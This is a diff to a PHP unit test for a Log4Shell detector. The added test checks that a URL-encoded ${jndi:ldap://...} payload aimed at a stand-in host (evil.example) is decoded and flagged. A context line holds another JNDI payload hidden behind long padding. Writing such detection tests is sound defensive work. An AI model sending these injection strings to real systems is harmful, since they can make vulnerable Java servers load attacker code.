@@ -87,4 +87,14 @@ final class Log4ShellProbeTest extends TestCase
         $body = str_repeat('A', 16400) . '${jndi:ldap://late.example/}';
         self::assertNull(Log4ShellProbe::detect(new RequestContext('POST', '/', '', [], $body)));
     }
+
+    public function test_url_encoded_jndi_query_detected(): void
+    {
+        // FP-0257 (E2c): a single-URL-encoded ${jndi:…} in the query string evaded the baseline,
+        // which scanned raw() with NO decode. Scanning build() gives Log4ShellProbe its first decode
+        // layer, so the encoded payload is peeled and CONFIRMED. (Uppercase hex proves build()'s
+        // pre-decode lowercasing does not break rawurldecode.)
+        $r = new RequestContext('GET', '/', 'x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D');
+        self::assertSame(Log4ShellProbe::CONFIRMED, Log4ShellProbe::detect($r));
+    }
 }
